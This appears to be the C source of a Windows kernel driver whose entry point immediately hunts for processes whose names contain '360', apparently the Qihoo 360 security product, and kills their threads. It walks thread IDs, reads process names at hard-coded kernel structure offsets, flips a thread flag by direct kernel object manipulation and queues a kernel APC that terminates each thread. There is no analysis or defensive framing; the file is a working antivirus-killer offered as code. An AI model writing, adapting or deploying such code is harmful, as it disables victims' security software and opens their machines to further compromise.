#include <ntddk.h>
typedef VOID (*MyPspExitThread)(NTSTATUS status);
MyPspExitThread PspExitThread;
NTSTATUS
	PsLookupProcessByProcessId(
	IN HANDLE ProcessId,
	OUT PEPROCESS *Process
	);

typedef enum _KAPC_ENVIRONMENT {
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT;

NTSTATUS
	PsLookupThreadByThreadId(
	IN HANDLE ThreadId,
	OUT PETHREAD *Thread
	);
PEPROCESS
	IoThreadToProcess(
	IN PETHREAD  Thread
	); 

VOID KeInitializeApc (
	PKAPC Apc,
	PETHREAD Thread,
	KAPC_ENVIRONMENT Environment,
	PKKERNEL_ROUTINE KernelRoutine,
	PKRUNDOWN_ROUTINE RundownRoutine,
	PKNORMAL_ROUTINE NormalRoutine,
	KPROCESSOR_MODE ProcessorMode,
	PVOID NormalContext
	);

BOOLEAN KeInsertQueueApc(PKAPC Apc,PVOID SystemArg1,PVOID SystemArg2,KPRIORITY Increment);
VOID APCRT(PKAPC Apc,PKNORMAL_ROUTINE*NormalRoutine,PVOID  *NormalContext,PVOID *SystemArgument1,PVOID *SystemArgument2)
{
	ExFreePool(Apc);
	//PspExitThread = (MyPspExitThread)0x805d3086;
	//PspExitThread(STATUS_SUCCESS);
	PsTerminateSystemThread(STATUS_SUCCESS);
}

BOOLEAN My_PspTerminateProcess()
{
	ULONG i;
	PETHREAD txtd;
	PEPROCESS txps;
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	for (i=8;i<=65536;i+=4)
	{
		st = PsLookupThreadByThreadId(i,&txtd);
		if ( NT_SUCCESS(st) )
		{
			txps=IoThreadToProcess(txtd);
			if (strstr((const char*)(ULONG)txps+0x174,"360") != NULL)
					MyPspTerminatePsByPointer(txtd);
		}
	}
	return TRUE;
}

NTSTATUS MyPspTerminatePsByPointer(PETHREAD Thread)
{
	//系统线程常量标志
	ULONG Systerm_Thread_Sign= 0x10;
	ULONG Size = 0;
	ULONG i = 0;
	PKAPC pApc = 0;

	if ( MmIsAddressValid((PVOID)Thread))//首先要校验地址,有效的话就DKOM
	{
		*(PULONG)((ULONG)Thread + 0x248) =Systerm_Thread_Sign;

		pApc = ExAllocatePoolWithTag(NonPagedPool,sizeof(KAPC),'apc');

		if (pApc)
		{
			//apcrt 是apc例程
			KeInitializeApc(pApc,Thread,OriginalApcEnvironment,APCRT,0,0,KernelMode,0);
			KeInsertQueueApc(pApc,pApc,0,2);
		}
	}
	return STATUS_SUCCESS;
}

PEPROCESS SearchProcessByName(const char* ProcessName)
{
	ULONG i = 0;
	PEPROCESS hProcess;
	for(i=0;i<65535;i+=4)
	{
		if(PsLookupProcessByProcessId((HANDLE)i,&hProcess)==STATUS_SUCCESS)
		{
			if (strcmp(ProcessName,(char*)((ULONG)hProcess+0x174)) == 0)
			{
				return hProcess;
			}
		}
	}
	return NULL;
}

VOID Terminate360()
{
	//strcmp((const char*)(ULONG)txps+0x174,processname) == 0
	My_PspTerminateProcess();
}

void DriverUnload(PDRIVER_OBJECT driver)
{
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path)
{
	Terminate360();
	driver->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}